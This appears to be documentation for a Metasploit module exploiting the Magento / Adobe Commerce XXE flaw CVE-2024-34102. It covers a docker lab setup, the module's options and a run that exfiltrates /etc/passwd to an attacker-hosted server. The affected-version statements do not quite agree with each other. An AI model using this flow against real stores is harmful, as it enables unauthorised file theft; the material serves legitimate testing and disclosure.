## Vulnerable Application

### Description

An unauthenticated user can read arbritraty file from Magento Community edition version 2.4.0 to 2.4.3.
The vulnerability is due to the lack of input validation in the XML file. An attacker can exploit this
vulnerability by sending a specially crafted XML file to the target server. The attacker can read any file on the server.

On June 27, 2024, Adobe released a software update that addressed this vulnerability (CVE-2024-34102).

The following products are affected:

- Adobe Commerce: versions before:      2.4.7; 2.4.6-p5; 2.4.5-p7; 2.4.4-p8; 2.4.3-ext-7 ; 2.4.2-ext-7
- Magento Open Source: versions before: 2.4.7; 2.4.6-p5; 2.4.5-p7; 2.4.4-p8
- Adobe Commerce Webhooks Plugin: versions 1.2.0 to 1.4.0

### Exploitation

This module exploits the XXE vulnerability in Magento by following these steps:

- Creating a DTD File: This file includes entities that will read and encode `FILE`, then send it to your endpoint.

- Host the DTD File: Serve the dtd.xml file, accessible via HTTP `SRVHOST` on port `SRVPORT`.

- Craft the HTTP Request: Craft the XML payload which will include the DTD file hosted on your server.

- Execute a HTTP Request: Send the crafted XML payload to the target server.

- Capture the Exfiltrated Data: The exfiltrated data will be sent back to the attacker in a HTTP GET request and them saved in the loot.



### Setup

Create a `docker-compose.yml` file as below:

```yml
version: '2'
services:
  mariadb:
    image: docker.io/bitnami/mariadb:10.6
    environment:
      # ALLOW_EMPTY_PASSWORD is recommended only for development.
      - ALLOW_EMPTY_PASSWORD=yes
      - MARIADB_USER=bn_magento
      - MARIADB_DATABASE=bitnami_magento
    volumes:
      - 'mariadb_data:/bitnami/mariadb'
  magento:
    image: docker.io/bitnami/magento:2
    ports:
      - '80:8080'
      - '443:8443'
    environment:
      - MAGENTO_HOST=localhost
      - MAGENTO_DATABASE_HOST=mariadb
      - MAGENTO_DATABASE_PORT_NUMBER=3306
      - MAGENTO_DATABASE_USER=bn_magento
      - MAGENTO_DATABASE_NAME=bitnami_magento
      - ELASTICSEARCH_HOST=elasticsearch
      - ELASTICSEARCH_PORT_NUMBER=9200
      # ALLOW_EMPTY_PASSWORD is recommended only for development.
      - ALLOW_EMPTY_PASSWORD=yes
    volumes:
      - 'magento_data:/bitnami/magento'
    depends_on:
      - mariadb
      - elasticsearch
  elasticsearch:
    image: docker.io/bitnami/elasticsearch:7
    volumes:
      - 'elasticsearch_data:/bitnami/elasticsearch/data'
volumes:
  mariadb_data:
    driver: local
  magento_data:
    driver: local
  elasticsearch_data:
    driver: local
```

Run the below command to create the container:

```
$ docker-compose up
```


## Verification Steps
Follow [Setup](#setup) and [Scenarios](#scenarios).

## Options

### TARGETURI (required)

The path to the Magento (Default: `/`).

### SRVHOST (required)

The local IP address to listen on. This must be a routable IP address on the local machine (0.0.0.0 is invalid). 

### SRVPORT (required)

The local port to listen on.

## Scenarios

### Docker container running Magento Community edition version 2.4

```
Module options (exploit/multi/http/magento_xxe_cve_2024_34102):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILE       /etc/passwd      yes       The file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    192.168.128.1    yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST      localhost        no        HTTP server virtual host
```

```   
msf6 exploit(multi/http/magento_xxe_cve_2024_34102) > 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Using URL: http://192.168.128.1:8080/
[*] Sending XXE request
[*] Received request for DTD file from 192.168.144.4
[+] Received file /etc/passwd content
[+] File saved in: /home/redwaysecurity/.msf4/loot/20240715171929_default_127.0.0.1_etcpasswd_069426.txt

msf6 exploit(multi/http/magento_xxe_cve_2024_34102) > cat /home/redwaysecurity/.msf4/loot/20240715171929_default_127.0.0.1_etcpasswd_069426.txt
[*] exec: cat /home/redwaysecurity/.msf4/loot/20240715171929_default_127.0.0.1_etcpasswd_069426.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
msf6 exploit(multi/http/magento_xxe_cve_2024_34102) > 
```
